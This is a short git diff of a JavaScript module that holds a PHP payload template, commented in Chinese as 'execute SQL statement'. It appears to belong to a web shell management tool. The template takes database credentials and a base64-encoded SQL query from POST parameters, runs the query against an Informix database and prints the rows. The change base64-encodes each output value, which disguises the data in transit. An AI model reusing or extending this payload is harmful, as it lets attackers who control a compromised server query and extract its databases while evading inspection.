@@ -38,7 +38,7 @@ module.exports = {
   // 执行SQL语句
   query: {
     _:
-      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query($sql,$T);$i=0;while($rs=@ifx_fetch_row($q)){if($i==0){for(reset($rs);$f=key($rs);next($rs)){echo($f."\t|\t");}echo("\r\n");}for(reset($rs);$f=key($rs);next($rs)){echo(trim($rs[$f]));echo("\t|\t");}echo("\r\n");$i++;}@ifx_close($T);`,
+      `$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$T=(strlen($usr)>0)?@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query($sql,$T);$i=0;while($rs=@ifx_fetch_row($q)){if($i==0){for(reset($rs);$f=key($rs);next($rs)){echo($f."\t|\t");}echo("\r\n");}for(reset($rs);$f=key($rs);next($rs)){echo(base64_encode(trim($rs[$f])));echo("\t|\t");}echo("\r\n");$i++;}@ifx_close($T);`,
     [arg1]: '#{host}',
     [arg2]: '#{user}',
     [arg3]: '#{passwd}',
